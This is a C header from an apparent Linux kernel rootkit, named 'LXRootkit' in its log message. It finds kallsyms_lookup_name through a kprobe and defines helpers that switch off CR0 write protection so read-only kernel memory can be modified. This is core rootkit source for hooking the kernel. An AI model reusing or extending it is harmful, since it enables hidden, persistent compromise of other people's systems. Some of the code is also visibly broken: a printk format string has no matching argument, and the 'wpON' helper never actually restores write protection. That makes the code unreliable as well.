#pragma once 

#include "pch.h"

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

/* return the function address by name */ 
unsigned long dumpAddr(const char* name) 
{
    unsigned long addr; 

    typedef unsigned long(*tp_kallsyms_lookup_name)(const char* name);
    tp_kallsyms_lookup_name kallsyms_lookup_name;
 
    register_kprobe(&kp);
   
    kallsyms_lookup_name = (tp_kallsyms_lookup_name)kp.addr; 
    unregister_kprobe(&kp);   
    
    addr = kallsyms_lookup_name(name); 
    if(!addr) {
        printk(KERN_INFO "[-] LXRootkit: unable to resolve [%s] address...\n");
        return -1;
    }

    return addr; 
}

inline void writeCR0(unsigned long cr0) 
{
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

inline void wpOFF(void) 
{
    unsigned long __cr0 = read_cr0(); 
    writeCR0(__cr0 & ~0x00010000); 
}

inline void wpON(void)
{
    unsigned long __cr0 = read_cr0();
    writeCR0(__cr0); 
}
